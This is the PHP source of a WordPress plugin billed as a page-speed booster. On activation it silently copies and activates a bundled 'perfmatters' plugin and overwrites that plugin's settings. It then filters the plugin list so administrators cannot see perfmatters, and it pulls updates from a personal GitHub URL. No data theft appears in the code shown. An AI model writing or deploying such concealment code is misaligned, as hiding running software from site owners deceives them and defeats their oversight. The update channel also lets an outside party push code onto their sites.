<?php
/*
Plugin Name: SiteSpeeder
Description: make site pagespeed higher
Version: 1.0
Author: Spider
*/

// 防止直接访问
if (! defined('ABSPATH')) {
	exit;
}






class Sanou_Enhance
{

	private $package_slug = 'perfmatters'; // 目标插件目录名（packages 里应该为 packages/perfmatters）
	private $package_src_dir; // path to plugin/packages/perfmatters
	private $target_plugin_dir; // WP_PLUGIN_DIR/perfmatters
	private $imported_option_key = 'sanou_enhance_imported_configs'; // 记录导入的 config 列表

	public function __construct()
	{
		$this->package_src_dir = plugin_dir_path(__FILE__) . 'packages/' . $this->package_slug;
		$this->target_plugin_dir = WP_PLUGIN_DIR . '/' . $this->package_slug;


		register_activation_hook(__FILE__, array($this, 'on_activate'));
		register_deactivation_hook(__FILE__, array($this, 'on_deactivate'));

		// 在插件列表中隐藏目标插件（仅在管理员页面生效）
		add_filter('all_plugins', array($this, 'hide_perfmatters_from_plugins_list'), 10, 1);
		// add_action('sanou_enhance_delete_perfmatters_dir', [$this, 'delete_perfmatters_dir']);

		$this->puc();
	}

	public function puc()
	{
		if (is_admin()) {
			require_once(plugin_dir_path(__FILE__) . 'puc/plugin-update-checker.php');

			$MyUpdateChecker = Puc_v4_Factory::buildUpdateChecker(
				'https://raw.githubusercontent.com/zouyinwangzi/zk-update-packages/refs/heads/master/sitespeeder/info.json',
				__FILE__,
				'sitespeeder'
			);
		}
	}

	/**
	 * 激活 sanou-enhance 时执行
	 */
	public function on_activate()
	{
		// 1. 复制 packages -> WP 插件目录
		if (! is_dir($this->package_src_dir)) {
			error_log('[sanou-enhance] packages source not found: ' . $this->package_src_dir);
			return;
		}

		// 如果目标已存在，先不删除（以免误删）；不过可以覆盖
		$copy_success = $this->recursive_copy($this->package_src_dir, $this->target_plugin_dir);
		if (! $copy_success) {
			error_log('[sanou-enhance] copy perfmatters to plugins dir failed');
			return;
		}

		// 2. 找到目标插件的主插件文件（含 Plugin Name: header）
		$main_plugin_file = $this->find_plugin_main_file($this->target_plugin_dir);

		if (! $main_plugin_file) {
			error_log('[sanou-enhance] cannot locate perfmatters main plugin file in ' . $this->target_plugin_dir);
			return;
		}


		// 3. 激活 perfmatters 插件
		if (! function_exists('activate_plugin')) {
			require_once ABSPATH . 'wp-admin/includes/plugin.php';
		}

		$rel_path = $this->package_slug . '/' . $main_plugin_file; // plugin_basename style
		error_log('[sanou-enhance] main_plugin_file: ' . $rel_path);

		wp_clean_plugins_cache();


		// 如果已经激活则跳过
		if (! is_plugin_active($rel_path)) {
			$activate_result = activate_plugin($rel_path);
			if (is_wp_error($activate_result)) {
				error_log('[sanou-enhance] activate perfmatters failed: ' . $activate_result->get_error_message());
				// 继续尝试配置导入（即使激活失败）
			}
		}

		// 4. 导入 configs 下的配置文件
		$this->import_configs_to_perfmatters();

		// 保存一个 option 记录当前已安装并激活的 perfmatters plugin file
		update_option('sanou_enhance_perfmatters_main_file', $rel_path);
	}

	public function on_deactivate()
	{
		error_log('[sanou-enhance] --- on_deactivate() called ---');

		// 1️⃣ 获取主文件路径
		$main_rel = get_option('sanou_enhance_perfmatters_main_file');
		if (! $main_rel) {
			$main_plugin_file = $this->find_plugin_main_file($this->target_plugin_dir);
			if ($main_plugin_file) {
				$main_rel = $this->package_slug . '/' . $main_plugin_file;
			}
		}
		error_log('[sanou-enhance] deactivate start, main_rel=' . $main_rel);

		// 2️⃣ 停用 perfmatters
		if ($main_rel && file_exists(WP_PLUGIN_DIR . '/' . $main_rel)) {
			if (! function_exists('deactivate_plugins')) {
				require_once ABSPATH . 'wp-admin/includes/plugin.php';
			}

			wp_clean_plugins_cache();

			if (is_plugin_active($main_rel)) {
				error_log('[sanou-enhance] scheduling perfmatters deactivate on shutdown...');
				add_action('shutdown', function () use ($main_rel) {
					if (! function_exists('deactivate_plugins')) {
						require_once ABSPATH . 'wp-admin/includes/plugin.php';
					}
					deactivate_plugins($main_rel, false, false);
					wp_clean_plugins_cache();
					error_log('[sanou-enhance] perfmatters deactivated (shutdown).');
				});
			}
		} else {
			error_log('[sanou-enhance] perfmatters main file not found, skip deactivate.');
		}

		wp_clean_plugins_cache();

		// 3️⃣ 在 shutdown 阶段删除 perfmatters 插件目录
		if (is_dir($this->target_plugin_dir)) {
			error_log('[sanou-enhance] scheduling perfmatters delete on shutdown...');
			add_action('shutdown', [$this, 'delete_perfmatters_dir']);
		}

		// 4️⃣ 清除导入配置
		$imported = get_option($this->imported_option_key, array());
		if (! empty($imported) && is_array($imported)) {
			foreach ($imported as $optkey) {
				delete_option($optkey);
			}
		}

		delete_option($this->imported_option_key);
		delete_option('sanou_enhance_perfmatters_main_file');

		wp_clean_plugins_cache();

		error_log('[sanou-enhance] deactivation complete.');
	}



	public function delete_perfmatters_dir()
	{
		$dir = $this->target_plugin_dir; // e.g. wp-content/plugins/perfmatters
		if (is_dir($dir)) {
			$this->recursive_delete($dir);
			error_log('[sanou-enhance] perfmatters directory deleted (shutdown).');
		} else {
			error_log('[sanou-enhance] shutdown delete: directory not found.');
		}

		wp_clean_plugins_cache();
	}



	/**
	 * 在插件列表中隐藏 perfmatters（通过过滤 all_plugins）
	 */
	public function hide_perfmatters_from_plugins_list($all_plugins)
	{
		// 只有在管理员界面才隐藏
		if (! is_admin()) {
			return $all_plugins;
		}

		// 找到主插件相对路径（plugin_basename）
		$main_rel = get_option('sanou_enhance_perfmatters_main_file');
		if (! $main_rel) {
			$main_plugin_file = $this->find_plugin_main_file($this->target_plugin_dir);
			if ($main_plugin_file) {
				$main_rel = $this->package_slug . '/' . $main_plugin_file;
			}
		}

		if ($main_rel && isset($all_plugins[$main_rel])) {
			unset($all_plugins[$main_rel]);
		} else {
			// 如果找不到具体文件，尝试删除所有以 perfmatters/ 开头的项
			foreach ($all_plugins as $key => $val) {
				if (0 === strpos($key, $this->package_slug . '/')) {
					unset($all_plugins[$key]);
				}
			}
		}

		return $all_plugins;
	}

	/**
	 * 导入 configs 目录中的配置到 perfmatters
	 * 支持 JSON 文件（每个 json -> 一个 option 或触发 perfmatters 的导入函数）
	 * 导入成功后将记录导入的 option key 到 imported_option_key
	 */
	private function import_configs_to_perfmatters()
	{
		$configs_dir = plugin_dir_path(__FILE__) . 'configs';
		if (! is_dir($configs_dir)) {
			return;
		}

		$config_file = $configs_dir . '/perfmatters-settings.json';
		// error_log($config_file);
		if (file_exists($config_file)) {
			$config_content = file_get_contents($config_file);
			$settings = json_decode($config_content, true);
			// error_log($settings);
			if (isset($settings['perfmatters_options'])) {
				// error_log($settings['perfmatters_options']);
				update_option('perfmatters_options', $settings['perfmatters_options']);
			}

			if (isset($settings['perfmatters_tools'])) {
				// error_log($settings['perfmatters_tools']);

				update_option('perfmatters_tools', $settings['perfmatters_tools']);
			}
		}
		$imported_keys = array(
			'perfmatters_options',
			'perfmatters_tools',
		);
		update_option($this->imported_option_key, $imported_keys);
		return;


		// $imported_keys = get_option($this->imported_option_key, array());

		// $files = glob(rtrim($configs_dir, '/') . '/*');
		// if (empty($files)) {
		//     return;
		// }

		// foreach ($files as $f) {
		//     if (is_file($f)) {
		//         $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
		//         $basename = basename($f);

		//         if ($ext === 'json') {
		//             $raw = file_get_contents($f);
		//             $data = json_decode($raw, true);
		//             if (json_last_error() !== JSON_ERROR_NONE) {
		//                 error_log("[sanou-enhance] failed to parse json config {$basename}: " . json_last_error_msg());
		//                 continue;
		//             }

		//             // 优先：如果 perfmatters 提供导入函数，则尝试调用
		//             if (function_exists('perfmatters_import_settings')) {
		//                 try {
		//                     // perfmatters 自定义导入函数（若存在）
		//                     perfmatters_import_settings($data);
		//                     // 记录标记
		//                     $opt_key = 'perfmatters_imported_file_' . sanitize_title($basename);
		//                     update_option($opt_key, $data);
		//                     $imported_keys[] = $opt_key;
		//                 } catch (Exception $e) {
		//                     error_log("[sanou-enhance] perfmatters_import_settings exception: " . $e->getMessage());
		//                 }
		//             } else {
		//                 // 否则：将其保存为 option，命名规则：perfmatters_config_<filename>
		//                 $opt_key = 'perfmatters_config_' . sanitize_title(pathinfo($basename, PATHINFO_FILENAME));
		//                 update_option($opt_key, $data);
		//                 $imported_keys[] = $opt_key;

		//                 // 另外尝试：如果 perfmatters 使用特定 option 名（试探几种常见候选）
		//                 $candidates = array('perfmatters', 'perfmatters_settings', 'perfmatters_options');
		//                 foreach ($candidates as $cand) {
		//                     // 仅当 option 存在时才覆盖（谨慎）
		//                     if (get_option($cand) !== false) {
		//                         update_option($cand, $data);
		//                         $imported_keys[] = $cand;
		//                         break;
		//                     }
		//                 }

		//                 // 触发动作，允许 perfmatters 或第三方接收导入
		//                 do_action('sanou_enhance_after_import_config', $data, $basename);
		//             }
		//         } else {
		//             // 可扩展：支持 yaml、ini 等
		//             continue;
		//         }
		//     }
		// }

		// // 去重并保存记录
		// $imported_keys = array_values(array_unique($imported_keys));
		// update_option($this->imported_option_key, $imported_keys);
	}

	/**
	 * 递归复制目录
	 */
	private function recursive_copy($src, $dst)
	{
		if (! is_dir($src)) {
			return false;
		}

		// 如果目标不存在，尝试创建
		if (! is_dir($dst)) {
			if (! @mkdir($dst, 0755, true)) {
				// 尝试使用 WP_Filesystem
				if (! $this->mkdir_with_filesystem($dst)) {
					error_log("[sanou-enhance] failed to create dir: $dst");
					return false;
				}
			}
		}

		$dir = opendir($src);
		if (! $dir) {
			return false;
		}

		while (false !== ($file = readdir($dir))) {
			if (($file !== '.') && ($file !== '..')) {
				$srcfile = $src . '/' . $file;
				$dstfile = $dst . '/' . $file;

				if (is_dir($srcfile)) {
					$this->recursive_copy($srcfile, $dstfile);
				} else {
					if (! @copy($srcfile, $dstfile)) {
						// 尝试用 WP_Filesystem 写入
						$contents = file_get_contents($srcfile);
						if ($contents === false) {
							error_log("[sanou-enhance] failed to read file $srcfile");
							continue;
						}
						if (! $this->file_put_contents_with_filesystem($dstfile, $contents)) {
							error_log("[sanou-enhance] failed to copy $srcfile to $dstfile");
						}
					}
				}
			}
		}

		closedir($dir);
		return true;
	}

	/**
	 * 递归删除目录
	 */
	private function recursive_delete($dir)
	{
		if (! is_dir($dir)) {
			return;
		}
		$items = array_diff(scandir($dir), array('.', '..'));
		foreach ($items as $item) {
			$path = $dir . '/' . $item;
			if (is_dir($path)) {
				$this->recursive_delete($path);
			} else {
				@unlink($path);
			}
		}
		@rmdir($dir);
	}


	/**
	 * 检查文件前部（最多 8KB）是否包含 Plugin Name: header
	 */
	private function has_plugin_header($file_path)
	{
		if (! is_file($file_path) || ! is_readable($file_path)) {
			return false;
		}

		// 只读取开头部分，避免读取大文件
		$contents = @file_get_contents($file_path, false, null, 0, 8192);
		if ($contents === false) {
			return false;
		}

		// 先尝试匹配第一个注释块内是否包含 Plugin Name:
		if (preg_match('/^\s*\/\*(.*?)\*\//s', $contents, $m) && stripos($m[1], 'Plugin Name:') !== false) {
			return true;
		}

		// 兼容 PHPDoc 风格 / 更宽松的匹配（例如 /** ... */）
		if (preg_match('/^\s*<\?php\s*(?:\/\*\*(.*?)\*\/)/s', $contents, $m2) && isset($m2[1]) && stripos($m2[1], 'Plugin Name:') !== false) {
			return true;
		}

		// 最后回退：在前 8KB 中搜索 Plugin Name:（更宽松，但高概率为 header）
		if (stripos($contents, 'Plugin Name:') !== false) {
			return true;
		}

		return false;
	}

	/**
	 * 优化后的查找主插件文件：先水平扫描根目录（优先 perfmatters.php），再广度优先遍历子目录（每层同样优先 perfmatters.php）
	 * 返回相对于 $dir 的路径（如 perfmatters.php 或 inc/sub.php），找不到返回 false。
	 */
	private function find_plugin_main_file($dir)
	{
		if (! is_dir($dir)) {
			return false;
		}

		$dir = rtrim($dir, '/\\');

		// 1) 优先：根目录下是否存在 perfmatters.php
		$pref = $dir . DIRECTORY_SEPARATOR . 'perfmatters.php';
		if (is_file($pref) && $this->has_plugin_header($pref)) {
			return 'perfmatters.php';
		}

		// 2) 水平扫描根目录的所有 PHP 文件（优先返回最先找到的 header 文件）
		$root_entries = scandir($dir);
		foreach ($root_entries as $entry) {
			if ($entry === '.' || $entry === '..') {
				continue;
			}
			$path = $dir . DIRECTORY_SEPARATOR . $entry;
			if (is_file($path) && strtolower(pathinfo($entry, PATHINFO_EXTENSION)) === 'php') {
				if ($this->has_plugin_header($path)) {
					return $entry;
				}
			}
		}

		// 3) 广度优先遍历子目录（每个目录先检查 perfmatters.php，再检查其它 php 文件）
		$queue = new SplQueue();
		foreach ($root_entries as $entry) {
			if ($entry === '.' || $entry === '..') {
				continue;
			}
			$path = $dir . DIRECTORY_SEPARATOR . $entry;
			if (is_dir($path)) {
				$queue->enqueue($path);
			}
		}

		while (! $queue->isEmpty()) {
			$subdir = $queue->dequeue();

			// 优先：子目录中的 perfmatters.php
			$sub_pref = $subdir . DIRECTORY_SEPARATOR . 'perfmatters.php';
			if (is_file($sub_pref) && $this->has_plugin_header($sub_pref)) {
				$rel = substr($sub_pref, strlen($dir) + 1);
				return str_replace('\\', '/', $rel);
			}

			// 检查该子目录中的 php 文件
			$entries = @scandir($subdir);
			if ($entries === false) {
				continue;
			}
			foreach ($entries as $e) {
				if ($e === '.' || $e === '..') {
					continue;
				}
				$p = $subdir . DIRECTORY_SEPARATOR . $e;
				if (is_file($p) && strtolower(pathinfo($e, PATHINFO_EXTENSION)) === 'php') {
					if ($this->has_plugin_header($p)) {
						$rel = substr($p, strlen($dir) + 1);
						return str_replace('\\', '/', $rel);
					}
				} elseif (is_dir($p)) {
					$queue->enqueue($p); // 继续广度遍历
				}
			}
		}

		// 4) 兜底（不太可能）：深度递归查找任意第一个包含 Plugin Name: 的 php 文件
		$rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
		foreach ($rii as $file) {
			if ($file->isDir()) {
				continue;
			}
			if (strtolower($file->getExtension()) !== 'php') {
				continue;
			}
			$full = $file->getPathname();
			if ($this->has_plugin_header($full)) {
				$rel = substr($full, strlen($dir) + 1);
				return str_replace('\\', '/', $rel);
			}
		}

		return false;
	}


	/**
	 * 使用 WP_Filesystem mkdir 尝试创建目录（如果普通 mkdir 失败）
	 */
	private function mkdir_with_filesystem($dir)
	{
		if (! function_exists('request_filesystem_credentials')) {
			require_once ABSPATH . '/wp-admin/includes/file.php';
		}
		$creds = request_filesystem_credentials(site_url());
		if (! WP_Filesystem($creds)) {
			return false;
		}
		global $wp_filesystem;
		return $wp_filesystem->mkdir($dir);
	}

	/**
	 * 使用 WP_Filesystem 写文件（fallback）
	 */
	private function file_put_contents_with_filesystem($path, $contents)
	{
		if (! function_exists('request_filesystem_credentials')) {
			require_once ABSPATH . '/wp-admin/includes/file.php';
		}
		$creds = request_filesystem_credentials(site_url());
		if (! WP_Filesystem($creds)) {
			return false;
		}
		global $wp_filesystem;
		return $wp_filesystem->put_contents($path, $contents, FS_CHMOD_FILE);
	}
}

new Sanou_Enhance();
